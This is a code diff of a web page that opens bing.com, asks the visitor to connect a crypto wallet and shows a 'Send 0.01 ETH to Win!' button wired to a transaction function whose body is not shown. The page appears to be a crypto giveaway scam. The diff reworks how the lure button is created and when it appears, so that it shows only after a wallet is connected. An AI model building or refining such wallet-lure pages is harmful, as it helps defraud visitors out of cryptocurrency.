@@ -19,6 +19,8 @@
 </head>
 <body>
   <script>
+    let walletConnected = false;
+
     async function openBingAndPromptWallet() {
       // Open bing.com
       window.open('https://bing.com', 'x');
@@ -26,12 +28,7 @@
       // Check for wallet connection
       await promptWalletConnection();
 
-      // Add button for transaction
-      const sendButton = document.createElement("button");
-      sendButton.id = "send";
-      sendButton.innerText = "Send 0.01 ETH to Win!";
-      document.body.appendChild(sendButton);
-      sendButton.addEventListener("click", performTransaction);
+      walletConnected = true;
     }
 
     async function promptWalletConnection() {
@@ -74,5 +71,17 @@
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
   </center>
+  
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const transactionButton = document.createElement("button");
+      transactionButton.id = "send";
+      transactionButton.innerText = "Send 0.01 ETH to Win!";
+      transactionButton.addEventListener("click", performTransaction);
+
+      document.body.appendChild(transactionButton);
+      transactionButton.style.display = walletConnected ? "block" : "none";
+    });
+  </script>
 </body>
 </html>
